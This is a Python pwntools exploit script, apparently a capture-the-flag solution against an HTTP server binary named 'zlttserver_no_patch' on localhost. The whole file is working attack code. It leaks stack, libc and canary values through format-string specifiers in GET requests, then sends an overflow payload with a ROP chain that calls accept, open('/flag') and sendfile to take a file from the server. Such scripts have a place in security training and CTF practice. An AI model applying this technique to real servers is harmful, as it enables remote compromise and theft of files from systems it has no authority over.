from pwn import *
from LibcSearcher import *

def s(a):
	p.send(a)

def sl(a):
	if type(a)==str:a=a.encode()
	p.sendline(a)

def sa(a,b):
	if type(a)==str:a=a.encode()
	if type(b)==str:b=b.encode()
	p.sendafter(a,b)
	
def sla(a,b):
	if type(a)==str:a=a.encode()
	if type(b)==str:b=b.encode()
	p.sendlineafter(a,b)
	
def r(a=-1):
	if a==-1:return p.recv()
	else:return p.recv(a)

def ru(a):
	if type(a)==str:a=a.encode()
	return p.recvuntil(a)

def ls(a,b,c=-1):
	if c==-1:return LibcSearcher(a,b)
	else:return LibcSearcher(a,b,c)
	
def get():
	p.sendline(b"cat flag")
	ia()

# ph=lambda a:print(hex(a))
dbg=lambda :gdb.attach(p)
ia=lambda :p.interactive()
ptr=lambda :u64(r(6)+b"\x00\x00")

context.os="linux"
context.arch="amd64"
context.log_level="debug"

fname="./zlttserver_no_patch"
elf=ELF(fname)

lname="./libc.so.6"
libc=ELF(lname)

ip="127.0.0.1"
port="10000"
p=remote(ip,port)
#p=process(fname)
#p=gdb.debug(fname,"b main")

s("GET /%14$p HTTP")
ru("exist:.//0x")
stack=int(ru("<")[:-1],16)
stack1=stack+128
stack2=stack+92

p=remote(ip,port)
s("GET /%19$p HTTP")
ru("exist:.//0x")
free=int(ru("<")[:-1],16)-85
base=free-libc.sym["free"]
open_=base+libc.sym["open"]
accept=base+libc.sym["accept"]
sendfile=base+libc.sym["sendfile"]
rdi=base+0x2e6c5
rsi=base+0x30081
rdx=base+0x120272
rcx_rbx=base+0x10bd84

p=remote(ip,port)
s("GET /%63$p HTTP")
ru("exist:.//0x")
canary=int(ru("<")[:-1],16)

p=remote(ip,port)
pay=b"a"*256+p64(stack-272)+p64(canary)+b"/flag\x00\x00\x00"
pay+=p64(rdi)+p64(3)+p64(rsi)+p64(stack1)+p64(rdx)+p64(stack2)+p64(accept)
pay+=p64(rdi)+p64(stack)+p64(rsi)+p64(0)+p64(open_)
pay+=p64(rdi)+p64(4)+p64(rsi)+p64(5)+p64(rdx)+p64(0)+p64(rcx_rbx)+p64(0x100)+p64(0)+p64(sendfile)
s(pay)

p=remote(ip,port)

ia()
